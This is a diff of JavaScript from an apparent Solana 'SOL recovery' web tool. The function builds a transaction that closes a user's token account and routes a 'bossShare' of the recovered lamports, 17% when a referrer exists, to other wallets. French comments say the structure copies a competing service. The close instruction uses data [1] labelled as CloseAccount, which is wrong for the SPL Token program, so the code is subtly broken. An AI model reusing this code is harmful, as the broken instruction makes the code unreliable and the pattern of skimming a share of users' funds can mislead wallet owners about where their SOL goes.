@@ -1263,27 +1263,27 @@ async function scanTokens() {
         const transaction = new solanaWeb3.Transaction();
         const totalLamports = Math.floor(recoverableSOL * 1000000000);
 
-        // 1. COMPUTE BUDGET PROGRAM (EXACTEMENT COMME EUX)
+        // 1. COMPUTE BUDGET PROGRAM (EXACT COMME EUX)
         console.log("1. ⚡ Compute Budget Program...");
         const computeBudgetIx = solanaWeb3.ComputeBudgetProgram.setComputeUnitLimit({
-            units: 200000 // Comme claimyoursol
+            units: 200000
         });
         transaction.add(computeBudgetIx);
 
-        // 2. TOKEN PROGRAM - FERMETURE (EXACTEMENT COMME EUX)
+        // 2. TOKEN PROGRAM - FERMETURE (3 KEYS COMME EUX)
         console.log("2. 🔓 Token Program - Fermeture...");
         const closeIx = new solanaWeb3.TransactionInstruction({
             keys: [
-                { pubkey: tokenPublicKey, isSigner: false, isWritable: true },    // Source: token account
-                { pubkey: userPublicKey, isSigner: false, isWritable: true },     // Destination: user wallet
-                { pubkey: userPublicKey, isSigner: true, isWritable: false },     // Owner: user wallet
+                { pubkey: tokenPublicKey, isSigner: false, isWritable: true },    // SOURCE: token account
+                { pubkey: userPublicKey, isSigner: false, isWritable: true },     // DESTINATION: user wallet
+                { pubkey: userPublicKey, isSigner: true, isWritable: false },     // OWNER: user wallet
             ],
             programId: new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"),
-            data: new Uint8Array([1]) // CloseAccount
+            data: new Uint8Array([1]) // [1] comme eux!
         });
         transaction.add(closeIx);
 
-        // 3. SYSTEM PROGRAM - TRANSFERTS (EXACTEMENT COMME EUX)
+        // 3. SYSTEM PROGRAM - TRANSFERTS (COMME EUX)
         console.log("3. 💸 System Program - Transferts...");
         let bossShare = referrerPublicKey ? 
             Math.floor(totalLamports * 0.17) : 
@@ -1308,7 +1308,7 @@ async function scanTokens() {
         }
 
         // FINALISATION
-        console.log("4. 📤 Envoi transaction...");
+        console.log("4. 📤 Envoi...");
         const { blockhash } = await connection.getLatestBlockhash();
         transaction.recentBlockhash = blockhash;
         transaction.feePayer = userPublicKey;
